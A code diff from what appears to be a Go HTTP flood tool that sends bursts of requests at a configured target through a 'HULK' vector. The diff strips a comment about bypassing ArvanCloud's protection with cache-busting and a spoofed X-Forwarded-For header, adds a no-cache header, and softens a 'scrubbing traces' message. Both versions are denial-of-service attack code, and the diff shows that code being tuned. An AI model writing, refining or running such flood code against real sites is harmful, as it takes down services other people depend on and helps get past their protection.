@@ -25,17 +25,16 @@ func RunTacticalTest(cfg TacticalConfig, ctx context.Context) {
 	var wg sync.WaitGroup
 	sem := make(chan struct{}, MaxBurst)
 
-	// Pulls colors from your output package
+	// Pulls from your colors.go
 	fmt.Printf("\n%s[GHOST_MODE] ENGAGING %s VECTOR -> %s%s\n", output.NeonPink, cfg.Vector, cfg.Target, output.Reset)
 
 	for {
 		select {
 		case <-ctx.Done():
-			fmt.Printf("\n%s[+] Session Terminated. Scrubbing traces...%s\n", output.NeonGreen, output.Reset)
+			fmt.Printf("\n%s[+] Session Terminated. Clean Exit.%s\n", output.NeonGreen, output.Reset)
 			return
 		default:
 			if checkLocalCongestion() {
-				fmt.Printf("\r%s[!] GOVERNOR: Latency Spike Detected. Throttling...%s", output.Amber, output.Reset)
 				time.Sleep(1 * time.Second)
 				continue
 			}
@@ -58,10 +57,9 @@ func executeScrubbedVector(cfg TacticalConfig) {
 	
 	switch cfg.Vector {
 	case "HULK":
-		// Layer 7: Cache-Busting & Header Randomization for ArvanCloud bypass
 		req, _ := http.NewRequest("GET", "https://"+cfg.Target, nil)
 		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
-		req.Header.Set("X-Forwarded-For", fmt.Sprintf("10.0.%d.%d", time.Now().Second(), time.Now().Nanosecond()%255))
+		req.Header.Set("Cache-Control", "no-cache")
 		
 		resp, err := client.Do(req)
 		if err == nil { resp.Body.Close() }
